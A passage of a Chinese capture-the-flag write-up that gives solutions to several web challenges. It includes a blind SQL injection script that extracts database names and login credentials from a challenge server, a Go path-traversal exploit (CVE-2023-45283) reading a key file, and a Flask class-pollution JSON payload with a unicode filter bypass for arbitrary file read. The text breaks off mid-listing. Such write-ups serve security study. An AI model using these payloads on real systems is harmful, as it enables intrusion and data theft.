class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs perl">先附上官方脚本，利用的是table注入<br>import requests<br>import <span class="hljs-keyword">time</span><br><br>url = <span class="hljs-string">&quot;http://27.25.151.198:42907/login.php&quot;</span><br>flagstr = <span class="hljs-string">&quot;0123456789:;&lt;=&gt;?<span class="hljs-variable">@_</span>`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>&#125;<br><br>tempstr = <span class="hljs-string">&quot;&quot;</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>, <span class="hljs-number">15</span>):<br>    <span class="hljs-keyword">for</span> idx in range(len(flagstr)):  <span class="hljs-comment"># 使用索引遍历</span><br>        <span class="hljs-keyword">x</span> = flagstr[idx]  <span class="hljs-comment"># 获取当前字符</span><br>        prefix = tempstr + <span class="hljs-keyword">x</span><br><br>        <span class="hljs-comment"># 构造不同的payload</span><br>        payload1 = (<br>            <span class="hljs-string">&quot;1<span class="hljs-variable">%27</span>/**/||(<span class="hljs-variable">%27</span>&#123;&#125;<span class="hljs-variable">%27</span>,<span class="hljs-variable">%27</span>1<span class="hljs-variable">%27</span>,<span class="hljs-variable">%271</span>1<span class="hljs-variable">%27</span>,<span class="hljs-variable">%271</span>1<span class="hljs-variable">%27</span>)&lt;(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/1)#&quot;</span><br>            .format(tempstr + <span class="hljs-keyword">x</span>)<br>        )<br>        <span class="hljs-comment"># 获得数据库名: hnctfweb</span><br>        payload2 = (<br>            <span class="hljs-string">&quot;1<span class="hljs-variable">%27</span>/**/||(<span class="hljs-variable">%2</span>7hnctfweb<span class="hljs-variable">%27</span>,<span class="hljs-variable">%27</span>&#123;&#125;<span class="hljs-variable">%27</span>,<span class="hljs-variable">%271</span>1<span class="hljs-variable">%27</span>,<span class="hljs-variable">%271</span>1<span class="hljs-variable">%27</span>)&lt;(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/1)#&quot;</span><br>            .format(tempstr + <span class="hljs-keyword">x</span>)<br>        )<br>        <span class="hljs-comment"># 获得表名: hnctfuser</span><br>        payload3 = (<br>            <span class="hljs-string">&quot;1<span class="hljs-variable">%27</span>/**/||(<span class="hljs-variable">%27</span>&#123;&#125;<span class="hljs-variable">%27</span>,<span class="hljs-variable">%2</span>7<span class="hljs-variable">%27</span>,<span class="hljs-variable">%27</span>1<span class="hljs-variable">%27</span>,<span class="hljs-variable">%271</span>1<span class="hljs-variable">%27</span>)&lt;(table/**/hnctfuser/**/limit/**/1)#&quot;</span><br>            .format(tempstr + <span class="hljs-keyword">x</span>)<br>        )<br>        <span class="hljs-comment"># 获得第一列 id 值: 1</span><br>        payload4 = (<br>            <span class="hljs-string">&quot;1<span class="hljs-variable">%27</span>/**/||(<span class="hljs-variable">%27</span>1<span class="hljs-variable">%27</span>,<span class="hljs-variable">%27</span>&#123;&#125;<span class="hljs-variable">%27</span>,<span class="hljs-variable">%27</span>1<span class="hljs-variable">%27</span>,<span class="hljs-variable">%271</span>1<span class="hljs-variable">%27</span>)&lt;(table/**/hnctfuser/**/limit/**/1)#&quot;</span><br>            .format(tempstr + <span class="hljs-keyword">x</span>)<br>        )<br>        <span class="hljs-comment"># 获得第二列 username 值: admin</span><br>        payload5 = (<br>            <span class="hljs-string">&quot;1<span class="hljs-variable">%27</span>/**/||(<span class="hljs-variable">%27</span>1<span class="hljs-variable">%27</span>,<span class="hljs-variable">%2</span>7admin<span class="hljs-variable">%27</span>,<span class="hljs-variable">%27</span>&#123;&#125;<span class="hljs-variable">%27</span>,<span class="hljs-variable">%271</span>1<span class="hljs-variable">%27</span>)&lt;(table/**/hnctfuser/**/limit/**/1)#&quot;</span><br>            .format(tempstr + <span class="hljs-keyword">x</span>)<br>        )<br>        <span class="hljs-comment"># 获得第三列 password 值: admin123</span><br>        payload6 = (<br>            <span class="hljs-string">&quot;1<span class="hljs-variable">%27</span>/**/||(<span class="hljs-variable">%27</span>1<span class="hljs-variable">%27</span>,<span class="hljs-variable">%2</span>7admin<span class="hljs-variable">%27</span>,<span class="hljs-variable">%27admin12</span>3<span class="hljs-variable">%27</span>,<span class="hljs-variable">%27</span>&#123;&#125;<span class="hljs-variable">%27</span>)&lt;(table/**/hnctfuser/**/limit/**/1)#&quot;</span><br>            .format(tempstr + <span class="hljs-keyword">x</span>)<br>        )<br>        <span class="hljs-comment"># 获得第四列值: noflaginhere</span><br>        payload7 = (<br>            <span class="hljs-string">&quot;1<span class="hljs-variable">%27</span>/**/||(<span class="hljs-variable">%27</span>&#123;&#125;<span class="hljs-variable">%27</span>,<span class="hljs-variable">%27</span>1<span class="hljs-variable">%27</span>,<span class="hljs-variable">%27</span>1<span class="hljs-variable">%27</span>,<span class="hljs-variable">%27</span>1<span class="hljs-variable">%27</span>)&lt;(table/**/hnctfuser/**/limit/**/1/**/offset/**/1)#&quot;</span><br>            .format(tempstr + <span class="hljs-keyword">x</span>)<br>        )<br>        <span class="hljs-comment"># 获得 id 值: 2</span><br>        payload8 = (<br>            <span class="hljs-string">&quot;1<span class="hljs-variable">%27</span>/**/||(<span class="hljs-variable">%27</span>2<span class="hljs-variable">%27</span>,<span class="hljs-variable">%27</span>&#123;&#125;<span class="hljs-variable">%27</span>,<span class="hljs-variable">%27</span>1<span class="hljs-variable">%27</span>,<span class="hljs-variable">%27</span>1<span class="hljs-variable">%27</span>)&lt;(table/**/hnctfuser/**/limit/**/1/**/offset/**/1)#&quot;</span><br>            .format(tempstr + <span class="hljs-keyword">x</span>)<br>        )<br>        <span class="hljs-comment"># 获得需要的关键用户名: hackerohtii</span><br>        payload9 = (<br>            <span class="hljs-string">&quot;1<span class="hljs-variable">%27</span>/**/||(<span class="hljs-variable">%27</span>2<span class="hljs-variable">%27</span>,<span class="hljs-variable">%2</span>7hackerohtii<span class="hljs-variable">%27</span>,<span class="hljs-variable">%27</span>&#123;&#125;<span class="hljs-variable">%27</span>,<span class="hljs-variable">%27</span>1<span class="hljs-variable">%27</span>)&lt;(table/**/hnctfuser/**/limit/**/1/**/offset/**/1)#&quot;</span><br>            .format(tempstr + <span class="hljs-keyword">x</span>)<br>        )<br><br>        data = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>            <span class="hljs-string">&quot;password&quot;</span>: payload8<br>        &#125;<br><br>        res = requests.post(url=url, data=data, allow_redirects=False, headers=headers)<br><br>        <span class="hljs-comment"># 根据返回判断</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;登陆成功&quot;</span> in res.text:<br>            <span class="hljs-keyword">continue</span><br>        elif <span class="hljs-string">&quot;错误&quot;</span> in res.text:<br>            current_char = flagstr[idx - <span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">if</span> current_char == <span class="hljs-string">&#x27;~&#x27;</span>:<br>                <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;遇到 ~，提前终止，请确认数据是否正确。&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>            tempstr += current_char<br>            flag = tempstr<br>            <span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;当前结果: &#123;flag&#125;&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">print</span>(f<span class="hljs-string">&quot;最终结果: &#123;flag&#125;&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+## Watch
+
+看到提示注意go版本和路径形式，然后我们在所给的文件go.mod发现是go 1.2根据给的信息找到了CVE-2023-45283
+
+![](http://xendria.icu/wp-content/uploads/2025/06/2921507d-4850-4dce-a963-f7c89edb5ca6-1024x635.png)
+
+我们可以加个目录超越..\??\c:\来找他的c盘，发现都是空的，我们找找别的盘
+
+![](http://xendria.icu/wp-content/uploads/2025/06/7f569351-5b1d-4cac-929d-20ee98ee5ba5-1024x290.png)
+
+../??/d:/key.txt 获得key提交获得flag
+
+## 奇怪的咖啡店
+
+给的页面没什么东西，题目给了部分源码，那我们看看源码
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, render_template_string, render_template<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">32</span>).<span class="hljs-built_in">hex</span>()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">store</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;name&#x27;</span>):<br>        session[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&quot;customer&quot;</span>)<br>        session[<span class="hljs-string">&#x27;permission&#x27;</span>] = <span class="hljs-number">0</span><br><br>    error_message = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        error_message = <span class="hljs-string">&#x27;&lt;p style=&quot;color: red; font-size: 0.8em;&quot;&gt;该商品暂时无法购买，请稍后再试！&lt;/p&gt;&#x27;</span><br><br>    products = [<br>        &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;美式咖啡&quot;</span>, <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">9.99</span>, <span class="hljs-string">&quot;image&quot;</span>: <span class="hljs-string">&quot;1.png&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;橙c美式&quot;</span>, <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">19.99</span>, <span class="hljs-string">&quot;image&quot;</span>: <span class="hljs-string">&quot;2.png&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;摩卡&quot;</span>, <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">29.99</span>, <span class="hljs-string">&quot;image&quot;</span>: <span class="hljs-string">&quot;3.png&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">4</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;卡布奇诺&quot;</span>, <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">19.99</span>, <span class="hljs-string">&quot;image&quot;</span>: <span class="hljs-string">&quot;4.png&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;冰拿铁&quot;</span>, <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">29.99</span>, <span class="hljs-string">&quot;image&quot;</span>: <span class="hljs-string">&quot;5.png&quot;</span>&#125;<br>    ]<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,<br>                         error_message=error_message,<br>                         session=session,<br>                         products=products)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/add&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">adddd</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            &lt;html&gt;</span><br><span class="hljs-string">                &lt;body style=&quot;background-image: url(&#x27;/static/img/7.png&#x27;); background-size: cover; background-repeat: no-repeat;&quot;&gt;</span><br><span class="hljs-string">                    &lt;h2&gt;添加商品&lt;/h2&gt;</span><br><span class="hljs-string">                    &lt;form id=&quot;productForm&quot;&gt;</span><br><span class="hljs-string">                        &lt;p&gt;商品名称: &lt;input type=&quot;text&quot; id=&quot;name&quot;&gt;&lt;/p&gt;</span><br><span class="hljs-string">                        &lt;p&gt;商品价格: &lt;input type=&quot;text&quot; id=&quot;price&quot;&gt;&lt;/p&gt;</span><br><span class="hljs-string">                        &lt;button type=&quot;button&quot; onclick=&quot;submitForm()&quot;&gt;添加商品&lt;/button&gt;</span><br><span class="hljs-string">                    &lt;/form&gt;</span><br><span class="hljs-string">                    &lt;script&gt;</span><br><span class="hljs-string">                        function submitForm() &#123;</span><br><span class="hljs-string">                            const nameInput = document.getElementById(&#x27;name&#x27;).value;</span><br><span class="hljs-string">                            const priceInput = document.getElementById(&#x27;price&#x27;).value;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            fetch(`/add?price=$&#123;encodeURIComponent(priceInput)&#125;`, &#123;</span><br><span class="hljs-string">                                method: &#x27;POST&#x27;,</span><br><span class="hljs-string">                                headers: &#123;</span><br><span class="hljs-string">                                    &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,</span><br><span class="hljs-string">                                &#125;,</span><br><span class="hljs-string">                                body: nameInput</span><br><span class="hljs-string">                            &#125;)</span><br><span class="hljs-string">                            .then(response =&gt; response.text())</span><br><span class="hljs-string">                            .then(data =&gt; alert(data))</span><br><span class="hljs-string">                            .catch(error =&gt; console.error(&#x27;错误:&#x27;, error));</span><br><span class="hljs-string">                        &#125;</span><br><span class="hljs-string">                    &lt;/script&gt;</span><br><span class="hljs-string">                &lt;/body&gt;</span><br><span class="hljs-string">            &lt;/html&gt;</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>    <span class="hljs-keyword">elif</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> request.data:<br>            <span class="hljs-keyword">try</span>:<br>                raw_data = request.data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>                <span class="hljs-keyword">if</span> check(raw_data):<br>                <span class="hljs-comment">#检测添加的商品是否合法</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;该商品违规，无法上传&quot;</span><br>                json_data = json.loads(raw_data)<br><br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(json_data, <span class="hljs-built_in">dict</span>):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;添加失败1&quot;</span><br><br>                merge(json_data, add)<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;你无法添加商品哦&quot;</span><br><br>            <span class="hljs-keyword">except</span> (UnicodeDecodeError, json.JSONDecodeError):<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;添加失败2&quot;</span><br>            <span class="hljs-keyword">except</span> TypeError <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;添加失败3&quot;</span><br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;添加失败4&quot;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;添加失败5&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br>app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>,port=<span class="hljs-number">5014</span>)<br></code></pre></td></tr></table></figure>
+
+我们喂ai，它说有个明显的原型链污染存在于/add路由
+
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">merge</span><span class="hljs-params">(json_data, add)</span></span><span class="hljs-comment">//这个是污染点</span><br></code></pre></td></tr></table></figure>
+
+那我们就能去污染他来个任意文件读取？
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;app&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;_static_folder&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+然后发现回显的不是 你无法添加商品哦而是添加失败5，应该是被过滤了，我们能用unicode编码绕过
+
+![](http://xendria.icu/wp-content/uploads/2025/06/2a81a52a-6556-4977-a707-d11e69299af2-1024x551.png)
+
+我们查看源码/static/app/app.py
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, request, render_template_string, render_template<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">32</span>).<span class="hljs-built_in">hex</span>()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">store</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;name&#x27;</span>):<br>        session[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&quot;customer&quot;</span>)<br>        session[<span class="hljs-string">&#x27;permission&#x27;</span>] = <span class="hljs-number">0</span><br><br>    error_message = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        error_message = <span class="hljs-string">&#x27;&lt;p style=&quot;color: red; font-size: 0.8em;&quot;&gt;该商品暂时无法购买，请稍后再试！&lt;/p&gt;&#x27;</span><br><br>    products = [<br>        &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;美式咖啡&quot;</span>, <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">9.99</span>, <span class="hljs-string">&quot;image&quot;</span>: <span class="hljs-string">&quot;1.png&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;橙c美式&quot;</span>, <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">19.99</span>, <span class="hljs-string">&quot;image&quot;</span>: <span class="hljs-string">&quot;2.png&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;摩卡&quot;</span>, <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">29.99</span>, <span class="hljs-string">&quot;image&quot;</span>: <span class="hljs-string">&quot;3.png&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">4</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;卡布奇诺&quot;</span>, <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">19.99</span>, <span class="hljs-string">&quot;image&quot;</span>: <span class="hljs-string">&quot;4.png&quot;</span>&#125;,<br>        &#123;<span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;冰拿铁&quot;</span>, <span class="hljs-string">&quot;price&quot;</span>: <span class="hljs-number">29.99</span>, <span class="hljs-string">&quot;image&quot;</span>: <span class="hljs-string">&quot;5.png&quot;</span>&#125;<br>    ]<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,<br>                         error_message=error_message,<br>                         session=session,<br>                         products=products)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/add&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">adddd</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            &lt;html&gt;</span><br><span class="hljs-string">                &lt;body style=&quot;background-image: url(&#x27;/static/img/7.png&#x27;); background-size: cover; background-repeat: no-repeat;&quot;&gt;</span><br><span class="hljs-string">                    &lt;h2&gt;添加商品&lt;/h2&gt;</span><br><span class="hljs-string">                    &lt;form id=&quot;productForm&quot;&gt;</span><br><span class="hljs-string">                        &lt;p&gt;商品名称: &lt;input type=&quot;text&quot; id=&quot;name&quot;&gt;&lt;/p&gt;</span><br><span class="hljs-string">                        &lt;p&gt;商品价格: &lt;input type=&quot;text&quot; id=&quot;price&quot;&gt;&lt;/p&gt;</span><br><span class="hljs-string">                        &lt;button type=&quot;button&quot; onclick=&quot;submitForm()&quot;&gt;添加商品&lt;/button&gt;</span><br><span class="hljs-string">                    &lt;/form&gt;</span><br><span class="hljs-string">                    &lt;script&gt;</span><br><span class="hljs-string">                        function submitForm() &#123;</span><br><span class="hljs-string">                            const nameInput = document.getElementById(&#x27;name&#x27;).value;</span><br><span class="hljs-string">                            const priceInput = 